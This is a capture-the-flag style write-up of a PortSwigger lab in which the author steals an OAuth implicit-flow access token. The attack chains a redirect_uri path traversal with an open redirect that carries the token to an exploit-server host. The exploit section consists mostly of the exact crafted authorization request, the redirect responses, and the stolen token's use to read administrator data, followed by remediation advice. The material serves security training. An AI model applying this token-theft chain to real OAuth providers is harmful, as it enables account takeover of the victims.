# 🧨 OAuth Implicit Flow — Access Token Theft via `redirect_uri` Path Traversal

![Vuln](https://img.shields.io/badge/vuln-OAuth%20Misconfiguration-red)
![Severity](https://img.shields.io/badge/severity-high-orange)
![Platform](https://img.shields.io/badge/platform-PortSwigger%20Academy-blue)
![Status](https://img.shields.io/badge/status-solved-success)

A hands-on PortSwigger Web Security Academy walkthrough showing how weak `redirect_uri` validation, a path-normalization bypass, and an open redirect can leak an OAuth implicit-flow access token to an attacker-controlled server.

## Summary

The application uses OAuth's implicit flow (`response_type=token`). The OAuth provider accepts a callback that begins with the legitimate `/oauth-callback` path, but normalizes `/oauth-callback/..//post/next` into the application's open redirect. The provider attaches the access token as a URL fragment; the open redirect then carries it to the exploit server.

```text
Weak redirect_uri validation
        +
/oauth-callback/..//post/next path traversal
        +
Open redirect (/post/next?path=...)
        +
Implicit-flow fragment token
        =
Access-token leakage
```

## Lab Environment

| Component | Value |
|---|---|
| Platform | PortSwigger Web Security Academy |
| OAuth flow | Implicit grant |
| Client callback | `/oauth-callback` |
| Redirect endpoint | `/post/next?path=...` |
| OAuth scopes | `openid profile email` |
| Objective | Obtain an OAuth token through the redirect chain |

> Lab hosts and token values below were generated for this training instance and are now expired. Cookie and token secrets are redacted; the exploit path and request structure are preserved exactly.

## Recon — Normal OAuth Flow

The legitimate authorization request used `response_type=token`:

```http
GET /auth?client_id=oc7f01hdwoe9tznmxvvv4&redirect_uri=https://0adc009503e981488201518900ad00b7.web-security-academy.net/oauth-callback&response_type=token&nonce=720517963&scope=openid%20profile%20email HTTP/1.1
Host: oauth-0a4e0052034a81e2826e4fbd022d0082.oauth-server.net
```

The provider returned a 302 and placed the access token in the fragment:

```http
HTTP/2 302 Found
Location: https://0adc009503e981488201518900ad00b7.web-security-academy.net/oauth-callback#access_token=<REDACTED_EPHEMERAL_ACCESS_TOKEN>&expires_in=3600&token_type=Bearer&scope=openid%20profile%20email
```

The callback reads that fragment client-side, calls `/me` with the token, then POSTs the identity to `/authenticate`:

```javascript
const urlSearchParams = new URLSearchParams(window.location.hash.substr(1));
const token = urlSearchParams.get('access_token');

fetch('https://oauth-0a4e0052034a81e2826e4fbd022d0082.oauth-server.net/me', {
  method: 'GET',
  headers: {
    'Authorization': 'Bearer ' + token,
    'Content-Type': 'application/json'
  }
})
.then(r => r.json())
.then(j =>
  fetch('/authenticate', {
    method: 'POST',
    headers: {
      'Accept': 'application/json',
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({ email: j.email, username: j.sub, token: token })
  }).then(r => document.location = '/'))
```

## Finding the Open Redirect

The client application's next-post endpoint redirects to the value supplied in `path`:

```http
GET /post/next?path=/post?postId=8 HTTP/2
Host: 0adc009503e981488201518900ad00b7.web-security-academy.net

HTTP/2 302 Found
Location: /post?postId=8
```

Supplying an external destination confirmed that it is an open redirect:

```http
GET /post/next?path=https://exploit-0a7d00a2031481ed82d650060164006e.exploit-server.net HTTP/2
Host: 0adc009503e981488201518900ad00b7.web-security-academy.net

HTTP/2 302 Found
Location: https://exploit-0a7d00a2031481ed82d650060164006e.exploit-server.net
```

## Exploit — Bypassing `redirect_uri` Validation

The registered callback was `/oauth-callback`. I extended it with a path traversal sequence that resolved to the open redirect:

```text
/oauth-callback/..//post/next?path=https://exploit-0a7d00a2031481ed82d650060164006e.exploit-server.net
```

The exact modified authorization request was:

```http
GET /auth?client_id=oc7f01hdwoe9tznmxvvv4&redirect_uri=https://0adc009503e981488201518900ad00b7.web-security-academy.net/oauth-callback/..//post/next?path=https://exploit-0a7d00a2031481ed82d650060164006e.exploit-server.net&response_type=token&nonce=720517963&scope=openid%20profile%20email HTTP/2
Host: oauth-0a4e0052034a81e2826e4fbd022d0082.oauth-server.net
```

The OAuth provider accepted it and issued the token-bearing redirect:

```http
HTTP/2 302 Found
Location: https://0adc009503e981488201518900ad00b7.web-security-academy.net//post/next?path=https%3A%2F%2Fexploit-0a7d00a2031481ed82d650060164006e.exploit-server.net#access_token=<REDACTED_EPHEMERAL_ACCESS_TOKEN>&expires_in=3600&token_type=Bearer&scope=openid%20profile%20email
```

The target then redirects the browser to the exploit server:

```http
GET /post/next?path=https://exploit-0a7d00a2031481ed82d650060164006e.exploit-server.net HTTP/2
Host: 0adc009503e981488201518900ad00b7.web-security-academy.net

HTTP/2 302 Found
Location: https://exploit-0a7d00a2031481ed82d650060164006e.exploit-server.net
```

Because the redirect does not specify a replacement fragment, the browser retains the OAuth fragment. The final URL is effectively:

```text
https://exploit-0a7d00a2031481ed82d650060164006e.exploit-server.net#access_token=<REDACTED_EPHEMERAL_ACCESS_TOKEN>
```

An attacker page can read the fragment with:

```javascript
window.location.hash
```

## Token Validation

Using the leaked token against the provider's identity endpoint returned the administrator identity:

```http
GET /me HTTP/1.1
Host: oauth-0a4e0052034a81e2826e4fbd022d0082.oauth-server.net
Authorization: Bearer <REDACTED_EPHEMERAL_ACCESS_TOKEN>
Content-Type: application/json
```

```json
{
  "sub": "administrator",
  "apikey": "<REDACTED_EPHEMERAL_API_KEY>",
  "name": "Administrator",
  "email": "administrator@normal-user.net",
  "email_verified": true
}
```

This proved that the redirect chain leaked a valid administrator OAuth credential.

## Why the Chain Works

1. The OAuth provider validates `redirect_uri` too loosely, allowing a URI that starts at the trusted callback but contains `/../`.
2. URL path normalization reaches `/post/next`.
3. `/post/next` accepts an arbitrary absolute URL in `path`.
4. The implicit flow exposes the access token in the browser fragment.
5. The open redirect sends the browser to the attacker origin without replacing the fragment.
6. JavaScript on the attacker origin reads `window.location.hash`.

## Impact

An attacker who can cause a victim with an active OAuth session to follow the malicious authorization URL can obtain the victim's access token. In this lab, the token identified the administrator and exposed privileged account data. In a real deployment, this can lead to account takeover or unauthorized API access.

## Remediation

- Require an **exact**, canonical match between the requested `redirect_uri` and a registered callback URI; reject path traversal and normalization ambiguities.
- Remove open redirects, or constrain destinations to a server-side allowlist of relative paths.
- Prefer Authorization Code + PKCE over the implicit flow; do not expose bearer tokens in browser URLs.
- Keep OAuth tokens short-lived and scope them minimally.
- Treat URL-fragment forwarding across redirects as a token-leakage risk.

## References

- [PortSwigger — OAuth authentication](https://portswigger.net/web-security/oauth)
- [OAuth 2.0 Security Best Current Practice](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics)

---

<p align="center">
  <sub>Write-up by <strong>Sepehr Abolhasan</strong> · PortSwigger Web Security Academy training lab · Educational use only</sub>
</p>
